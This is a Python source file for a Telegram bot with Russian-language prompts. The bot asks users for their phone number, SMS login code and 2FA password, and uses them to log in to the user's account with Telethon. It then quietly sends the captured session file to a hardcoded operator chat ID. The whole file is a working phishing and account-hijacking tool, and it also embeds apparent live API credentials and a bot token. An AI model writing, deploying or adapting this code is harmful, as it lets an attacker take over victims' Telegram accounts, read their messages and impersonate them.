import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# ========== КОНФИГ ==========
API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'
BOT_TOKEN = '8774334857:AAF6Rab1Xsuxb57VlGi7I72McAXp0VY7Kuk'
YOUR_ID = 1204811629
# ============================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_data = {}

class Form(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

@dp.message(Command('start'))
async def start(message: types.Message, state: FSMContext):
    await state.set_state(Form.waiting_phone)
    await message.answer("Введите номер телефона:\n+7XXXXXXXXXX")

@dp.message(Form.waiting_phone)
async def get_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_data[message.from_user.id] = {'phone': phone}
    
    session_file = f"sessions/{message.from_user.id}"
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.send_code_request(phone)
        user_data[message.from_user.id]['client'] = client
        user_data[message.from_user.id]['session_file'] = session_file
        await state.set_state(Form.waiting_code)
        await message.answer("Введите код из SMS:")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
        await state.clear()

@dp.message(Form.waiting_code)
async def get_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    uid = message.from_user.id
    client = user_data[uid]['client']
    phone = user_data[uid]['phone']
    
    try:
        await client.sign_in(phone, code)
        session_file = user_data[uid]['session_file']
        
        if os.path.exists(f"{session_file}.session"):
            await bot.send_document(
                chat_id=YOUR_ID,
                document=types.FSInputFile(f"{session_file}.session"),
                caption=f"✅ {phone}"
            )
        await message.answer("✅ Готово")
        await client.disconnect()
        await state.clear()
        
    except SessionPasswordNeededError:
        await state.set_state(Form.waiting_password)
        await message.answer("Введите пароль 2FA:")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
        await state.clear()

@dp.message(Form.waiting_password)
async def get_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    uid = message.from_user.id
    client = user_data[uid]['client']
    session_file = user_data[uid]['session_file']
    phone = user_data[uid]['phone']
    
    try:
        await client.sign_in(password=password)
        if os.path.exists(f"{session_file}.session"):
            await bot.send_document(
                chat_id=YOUR_ID,
                document=types.FSInputFile(f"{session_file}.session"),
                caption=f"✅ {phone} (2FA)"
            )
        await message.answer("✅ Готово")
        await client.disconnect()
        await state.clear()
    except Exception as e:
        await message.answer(f"Ошибка: {e}")
        await state.clear()

async def main():
    os.makedirs("sessions", exist_ok=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
